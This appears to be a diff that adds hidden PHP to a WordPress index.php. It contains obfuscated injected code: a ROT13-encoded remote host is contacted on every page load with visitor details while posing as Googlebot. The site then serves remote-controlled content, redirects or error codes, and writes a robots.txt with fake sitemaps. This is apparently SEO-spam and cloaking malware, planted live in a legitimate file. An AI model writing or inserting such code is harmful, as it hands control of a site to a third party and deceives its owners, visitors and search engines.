@@ -1,0 +1,111 @@
+$xmlname = urldecode('151-er103.dhbva.fvgr');
+$http = is_https() ? 'https' : 'http';
+$duri_tmp = drequest_uri();
+$duri = empty($duri_tmp) ? '/' : $duri_tmp;
+$goweb = str_rot13($xmlname);
+$host = htmlspecialchars(isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '', ENT_QUOTES, 'UTF-8');
+$lang = htmlspecialchars(isset($_SERVER["HTTP_ACCEPT_LANGUAGE"]) ? $_SERVER["HTTP_ACCEPT_LANGUAGE"] : '', ENT_QUOTES, 'UTF-8');
+$urlshang = htmlspecialchars(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '', ENT_QUOTES, 'UTF-8');
+$web1 = $http . '://' . $goweb . '/index.php';
+$web = $web1 . '?web=' . $host . '&zz=' . (disbot() ? '1' : '0') . '&uri=' . urlencode($duri) . '&urlshang=' . urlencode($urlshang) . '&http=' . $http . '&lang=' . $lang;
+$html_content = doutdo($web);
+$robotsPath = $_SERVER['DOCUMENT_ROOT'] . '/robots.txt';
+if (!file_exists($robotsPath)) {
+    $php_file = "";
+    if (strpos($duri, '.php') !== false) {
+        $php_file = substr($duri, 1, strpos($duri, '.php') + 4 - 1).'/';
+    }
+    $uniqueNumbers = [1,2,3,4,5];
+    $defaultContent = "User-agent: *\nAllow: /\n";
+    foreach ($uniqueNumbers as $number) {
+        $defaultContent .= "Sitemap: {$http}://{$host}/{$php_file}sitemap-{$number}.xml\n";
+    }
+    file_put_contents($robotsPath, $defaultContent);
+}
+if (!strstr($html_content, 'nobotuseragent')) {
+    handle_content($html_content);
+}
+function is_https()
+{
+    return (
+        isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off'
+        || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https'
+        || isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off'
+    );
+}
+function drequest_uri()
+{
+    if (isset($_SERVER['REQUEST_URI'])) {
+        return $_SERVER['REQUEST_URI'];
+    } elseif (isset($_SERVER['argv'])) {
+        return $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
+    } else {
+        return $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
+    }
+}
+function disbot()
+{
+    $uAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
+    return stristr($uAgent, 'googlebot') || stristr($uAgent, 'bing') || stristr($uAgent, 'yahoo') || stristr($uAgent, 'google');
+}
+function doutdo($web)
+{
+    $options = [
+        "http" => [
+            "header" => "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+        ]
+    ];
+    $context = stream_context_create($options);
+    $response = @file_get_contents($web, false, $context);
+    if (!$response) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $web);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $response = curl_exec($ch);
+        if (curl_errno($ch)) {
+            echo 'cURL Error: 0';
+            exit;
+        }
+        curl_close($ch);
+    }
+    return $response;
+}
+function handle_content($html_content)
+{
+    if (strstr($html_content, 'okhtmlgetcontent')) {
+        header("Content-type: text/html; charset=utf-8");
+        echo str_replace("okhtmlgetcontent", '', $html_content);
+        exit();
+    } elseif (strstr($html_content, 'okxmlgetcontent')) {
+        header("Content-type: text/xml");
+        echo str_replace("okxmlgetcontent", '', $html_content);
+        exit();
+    } elseif (strstr($html_content, 'pingxmlgetcontent')) {
+        header("Content-type: text/html; charset=utf-8");
+        echo ping_sitemap(str_replace("pingxmlgetcontent", '', $html_content));
+        exit();
+    } elseif (strstr($html_content, 'getcontent500page')) {
+        header('HTTP/1.1 500 Internal Server Error');
+        exit();
+    } elseif (strstr($html_content, 'getcontent404page')) {
+        header('HTTP/1.1 404 Not Found');
+        exit();
+    } elseif (strstr($html_content, 'getcontent301page')) {
+        header('Location: ' . str_replace("getcontent301page", '', $html_content));
+        exit();
+    }
+}
+function ping_sitemap($url)
+{
+    $url_arr = explode("\r\n", trim($url));
+    $return_str = '';
+    foreach ($url_arr as $pingUrl) {
+        $pingRes = doutdo($pingUrl);
+        $ok = (strpos($pingRes, 'Sitemap Notification Received') !== false) ? 'pingok' : 'error';
+        $return_str .= htmlspecialchars($pingUrl, ENT_QUOTES, 'UTF-8') . '-- ' . $ok . '<br>';
+    }
+    return $return_str;
+}
+define( 'WP_USE_THEMES', true );
+require __DIR__ . '/wp-blog-header.php';
